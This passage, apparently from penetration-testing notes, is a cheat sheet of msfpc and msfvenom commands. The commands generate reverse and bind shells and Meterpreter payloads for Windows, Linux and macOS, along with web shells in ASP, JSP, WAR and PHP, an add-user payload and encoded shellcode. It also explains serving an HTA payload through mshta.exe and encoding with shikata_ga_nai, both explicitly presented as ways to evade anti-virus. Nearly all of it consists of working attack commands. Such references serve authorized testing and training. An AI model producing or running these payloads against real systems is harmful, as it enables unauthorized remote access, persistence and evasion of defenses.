msfpc.sh <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)

msfpc.sh Windows <IP> <PORT> CMD REVERSE STAGELESS TCP
msfpc.sh Windows <IP> <PORT> MSF REVERSE STAGED TCP

msfpc.sh Linux <IP> <PORT> CMD REVERSE STAGELESS TCP
msfpc.sh Linux <IP> <PORT> MSF REVERSE STAGED TCP
```

`msfvenom` cheat sheet:

```
# List platforms: msfvenom --help-platforms
# Basic platforms: windows & linux
# -a <ARCH> (Architecture): x86 or x64
# List payloads: msfvenom --list payloads
# List formats: msfvenom --help-formats
# List encoders: msfvenom --list encoders
# Recommended encoder: -e x86/shikata_ga_nai

msfvenom [-a <ARCH>] [--platform <PLATEFORM>] –p <PAYLOAD> [-e <ENCODER>] [-b <BADCHAR>] [--smallest] LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> [–f <FORMAT>] > <FILE>

# Windows payloads

# Staged payloads
msfvenom -a <x86 | x64> -p <windows/shell/reverse_tcp | windows/x64/shell/reverse_tcp> LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f exe > reverse.exe
msfvenom -a <x86 | x64> -p <windows/meterpreter/reverse_tcp | windows/x64/meterpreter/reverse_tcp> LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f exe > reverse.exe
msfvenom -a <x86 | x64> -p <windows/meterpreter/bind_tcp | windows/x64/meterpreter/bind_tcp>  LPORT=<LISTENING_PORT> -f exe > bind.exe

# Stageless payloads
msfvenom -a <x86 | x64> -p <windows/shell_reverse_tcp | windows/x64/shell_reverse_tcp> LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f exe > reverse.exe
msfvenom -a <x86 | x64> -p <windows/meterpreter_reverse_tcp | windows/x64/meterpreter_reverse_tcp> LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f exe > reverse.exe
msfvenom -a <x86 | x64> -p <windows/meterpreter_bind_tcp | windows/x64/meterpreter_bind_tcp> LPORT=<LISTENING_PORT> -f exe > bind.exe

# Unitary command execution
msfvenom -a <x86 | x64> -p <windows/exec | windows/x64/exec> CMD="<COMMAND>" -f <FORMAT> > <OUTPUT_FILENAME>

# Adds a local user.
msfvenom -a <x86 | x64> -p windows/adduser USER=<USERNAME> PASS=<PASSWORD> -f exe > adduser.exe

# Linux payloads

# Bash oneliner
msfvenom -p cmd/unix/reverse_bash LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f raw > shell.sh
# Basic and stable
msfvenom -p generic/shell_bind_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f elf > term.elf

# Stageless - CMD shell
msfvenom -p linux/x86/shell_bind_tcp --platform linux -a x86 PORT=<PORT> -f elf > bind_stageless.elf
msfvenom -p linux/x86/shell_reverse_tcp --platform linux -a x86 LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f elf > rev_stageless.elf
msfvenom -p linux/x64/shell_bind_tcp --platform linux -a x64 PORT=<PORT> -f elf > bind_x64_stageless.elf
msfvenom -p linux/x64/shell_reverse_tcp --platform linux -a x64 LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f elf > rev_x64_stageless.elf

# Staged - Meterpreter
msfvenom -p linux/x86/meterpreter/bind_tcp --platform linux -a x86 PORT=<PORT> -f elf > bind_meterpreter.elf
msfvenom -p linux/x86/meterpreter/reverse_tcp --platform linux -a x86 LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f elf > reverse_meterpreter.elf
msfvenom -p linux/x64/meterpreter/bind_tcp --platform linux -a x64 PORT=<PORT> -f elf > bind_meterpreter_x64.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp --platform linux -a x64 LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f elf > reverse_meterpreter_x64.elf

# Mac payloads
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f macho > reverse.macho
msfvenom -p osx/x86/shell_bind_tcp LPORT=<LISTENING_PORT> -f macho > bind.macho

# Web based payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f asp > reverse.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f raw > reverse.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f war > reverse.war
msfvenom -p php/meterpreter_reverse_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f raw > shell.php

# Script payloads
msfvenom -p cmd/unix/reverse_python LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f raw > reverse.py
msfvenom -p cmd/unix/reverse_perl LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f raw > reverse.pl

# Shellcodes
msfvenom –p <PAYLOAD> –f <FORMAT> -e <ENCODER> -b <BADCHAR> --smallest LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f bash > <FILE>
msfvenom –p <PAYLOAD> –f <FORMAT> -e <ENCODER> -b <BADCHAR> --smallest LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f powershell > <FILE>
```

###### Meterpreter through HTML Application

Windows HTML Application script can contain JavaScript or VBScript that will be
interpreted by the operating system.

The `metasploit` module `exploit/windows/misc/hta_server` can be used to
generate then host a HTA script that will launch a payload through PowerShell
when interpreted.

The HTA script can be interpreted through `Internet Explorer` or the Windows
utility `mshta.exe`. As the file is not written on disk but directly
interpreted from the remote URL, this technique can be used to bypass
some anti-virus solutions.

```
msf> use exploit/windows/misc/hta_server
[...]

mshta.exe http://<HOSTNAME | IP>:<PORT>/<FILENAME>.hta
```

###### Meterpreter as an encoded shellcode

`msfvenom` can be used to generate a `meterpreter` shellcode, which can later
be integrated and run from a compiled binary or a `PowerShell` script.

The encoder `shikata_ga_nai` with some iterations yields the best results.

The commands to generate a shellcode are as follows:

```
-- C output format
# x86 target
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST="<LISTENING_IP>" LPORT="<HOST_PORT>" -b \x00\x0a\x0d -e x86/shikata_ga_nai -i 20 -f c

# x64 target
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST="<LISTENING_IP>" LPORT="<HOST_PORT>" -b \x00\x0a\x0d -f c

-- PowerShell output format
# x86 target
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST="<LISTENING_IP>" LPORT="<HOST_PORT>" -b \x00\x0a\x0d -f powershell

# x64 target
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST="<LISTENING_IP>" LPORT="<HOST_PORT>" -b \x00\x0a\x0d -f powershell
```
